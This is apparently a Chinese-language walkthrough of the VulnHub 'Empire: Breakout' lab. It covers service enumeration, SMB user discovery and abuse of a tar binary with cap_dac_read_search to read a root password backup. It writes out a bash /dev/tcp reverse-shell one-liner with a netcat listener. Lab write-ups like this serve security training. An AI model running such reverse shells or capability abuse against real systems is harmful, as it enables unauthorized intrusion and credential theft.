---

title: Vulnhub--Empire:breakout
categories: [渗透靶场, Vulnhub]

---

## 渗透复现

1. 信息收集（端口信息，源码泄露，服务扫描）
2. 利用tar文件的特殊权限实现任意文件读取
3. su登录失败则执行反弹shell

## 知识扩展

1. tar文件具有可执行权，并且具备跨目录读取任意文件的特殊权限
2. backups（备份文件）中存在信息敏感文件

## 靶机地址

[Empire: Breakout ~ VulnHub](https://www.vulnhub.com/entry/empire-breakout,751/)

## 主机发现

（1）攻击机

```py
192.168.186.135
```

（2）目标靶机

```py
192.168.186.156
```

##  信息收集

###  端口扫描

![image-20240828155845457](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281558558.png)

###  目录访问

（1）80端口

![image-20240828155856665](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281558723.png)

（2）页面源码

![image-20240828155903912](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559957.png)

（3）bringfuck编码解密

![image-20240828155910755](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559800.png)

（4）10000端口（http访问）

![image-20240828155916065](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559105.png)

![image-20240828155922210](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559258.png)

（5）页面源码

![image-20240828155939524](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559573.png)

（6）端口20000（http访问）

![image-20240828155944946](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559987.png)

![image-20240828155949675](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559729.png)

（7）页面源码

![image-20240828155956350](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281559397.png)

### SMB服务探测

服务器开放smb服务，使用enum4linux进行smb服务的信息收集（成功拿到用户名）

```py
#enum4linux是SMB服务（文件共享协议）专用枚举型扫描器
enum4linux -a 192.168.186.156
```

![image-20240828160003359](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281600462.png)

## 实施攻击

（1）利用账号密码尝试登录平台

![image-20240828160014791](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281600839.png)

（2）成功登录20000端口的用户平台

![image-20240828160019753](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281600801.png)

（3）查找可用功能点（左下角具备开启用户shell功能）

![image-20240828160027624](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281600670.png)

![image-20240828160031876](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281600919.png)

##  提权

（1）发现敏感文件tar，查看tar文件权限（发现tar文件具有可执行权）

```py
ls -l tar
```

![image-20240828160044774](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281600823.png)

（2）getcap命令查看tar文件是否具备特殊权限

```py
#特殊权限可以让特定文件在没有root权限情况下对其他文件进行特权操作
#cap_dac_read_search：忽略文件读以及目录搜寻的限制
#tar文件具有可执行权，并且具有跨目录读取任意文件的特殊权限
#因此可以利用tar文件对重要信息文件进行打包再解压处理，从而绕过文件权限限制
getcap tar
```

![image-20240828160052238](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281600293.png)

（3）回到根目录搜寻重要信息文件（var/backups/目录下发现了隐藏文件.old_pass.bak）

![image-20240828160104210](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281601257.png)

![image-20240828160122861](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281601909.png)

（4）记录文件路径，回到tar文件所在目录下（没回到tar目录下的话是无法使用tar文件的）

```py
#将.old_pass.bak文件压缩为yeah.tar文件包
./tar -cvf yeah.tar /var/backups/.old_pass.bak
```

![image-20240828160130355](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281601403.png)

（5）解压yeah文件包，实现权限绕过

```py
#拿到root密码：Ts&4&YurgtRX(=~h
tar -xvf yeah.tar
```

![image-20240828160137431](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281601484.png)

（6）su登录失败，进行反弹shell

![image-20240828160144727](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281601776.png)

（7）kali开启监听端口

```py
#监听
nc -lvp 6666

#bash -i >& /dev/tcp/kali的IP/监听端口号0>&1
bash -i >& /dev/tcp/192.168.186.135/6666 0>&1
```

![image-20240828160152302](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281601359.png)

![image-20240828160202158](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281602198.png)

（8）成功反弹shell，登陆root用户，提权成功

![image-20240828160211217](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281602333.png)